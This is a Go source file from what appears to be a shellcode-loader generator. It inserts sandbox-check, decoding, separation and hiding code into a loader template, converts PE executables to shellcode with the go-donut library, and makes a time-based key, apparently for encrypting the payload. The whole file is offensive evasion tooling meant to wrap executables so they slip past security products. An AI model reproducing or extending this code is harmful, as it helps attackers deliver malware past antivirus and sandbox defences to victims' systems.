package core

import (
	"github.com/Binject/go-donut/donut"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
	"time"
)

//给loader文件插入代码，需注意import的库需要去重
func addCode(Code []string, method string) {
	loaderFileByte, _ := ioutil.ReadFile(path.Join(TempDir, "main.go"))
	loaderFile := string(loaderFileByte)
	var replaceString string
	switch method {
	case "sandbox":
		replaceString = "//__SANDBOX__"
	case "decode":
		replaceString = "//__DECODE__"
	case "separate":
		replaceString = "//__SEPARATE__"
	case "hide":
		replaceString = "//__HIDE__"
	}
	loaderFile = strings.Replace(loaderFile, replaceString, Code[0], 1)
	importField := strings.SplitAfter(loaderFile, "//__IMPORT__")[0]
	unImportField := strings.SplitAfter(loaderFile, "//__IMPORT__")[1]
	imports := strings.Split(importField, "\n")
	new := make([]string, 0)
	for i := 0; i < len(imports); i++ {
		if strings.Index(Code[1], imports[i]) == -1 {
			new = append(new, imports[i]+"\n")
		}
	}
	new = append(new, "\t//__IMPORT__\n")

	final := strings.Replace(strings.Join(new, "")+unImportField, "//__IMPORT__", Code[1], 1)
	//println(final)
	ioutil.WriteFile(path.Join(TempDir, "main.go"), []byte(final), os.ModePerm)
}

func PE2shellcode(srcFile string) {
	donutConfig := donut.DefaultConfig()
	payload, err := donut.ShellcodeFromFile(srcFile, donutConfig)
	if err != nil {
		log.Println(err)
	}
	err = ioutil.WriteFile(path.Join(TempDir, "shellcode"), payload.Bytes(), os.ModePerm)
	if err != nil {
		log.Println(err)
	}
}

func generateKey() []byte {
	key := time.Now().String()[5:27]
	err := ioutil.WriteFile(path.Join(TempDir, "key"), []byte(key), os.ModePerm)
	if err != nil {
		log.Println(err)
	}
	return []byte(key)
}
